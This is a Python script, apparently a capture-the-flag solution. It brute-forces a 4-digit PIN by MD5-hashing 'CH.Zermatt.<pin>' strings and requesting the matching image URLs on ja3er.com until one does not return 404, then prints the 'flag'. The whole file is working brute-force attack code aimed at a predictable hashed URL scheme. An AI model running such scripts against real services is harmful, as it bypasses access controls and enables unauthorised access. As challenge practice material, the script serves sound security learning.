import requests
import hashlib


# Sample URL: https://ja3er.com/img/e392078756e65caa2475ca70273658a9
# MD5 hashed String: CH..1111 (no "Zermatt" due to old code,
#                              which only allowed null region (/no region)
#                              to login.)
#
# Bruteforce Pattern: CH.Zermatt.<4-Digit-Pin>
#
# This script bruteforces all possible combinations of
# a 4 digit pin with the "CH.Zermatt." prefix (appended to the URL prefix).
# The prefix can be derived from the java application code.


def domd5hash(string):
    md5_hash = hashlib.md5(string.encode())
    return md5_hash.hexdigest()


def getUrl(md5_str):
    check_url = "https://ja3er.com/img/"
    url = check_url + md5_str
    return url


def doReq(url):
    status = requests.get(url).status_code
    if status == 404:
        return "wrong"
    else:
        return "correct"


def main():
    for i in range(10000):
        pin = "{0:04d}".format(i)
        print("Trying pin: ", pin)
        md5_inp = "CH.Zermatt." + str(pin)
        md5 = domd5hash(md5_inp)
        url = getUrl(md5)
        req_try = doReq(url)
        if req_try == "correct":
            print("Correct pin: " + pin)
            print("Correct URL: " + url)
            print("Output (Flag): " + requests.get(url).text)
            break
        else:
            continue


if __name__ == "__main__":
    main()

# Check if MD5 hash is identical to Sample URL Hash:
# print(domd5hash("CH..1111"))
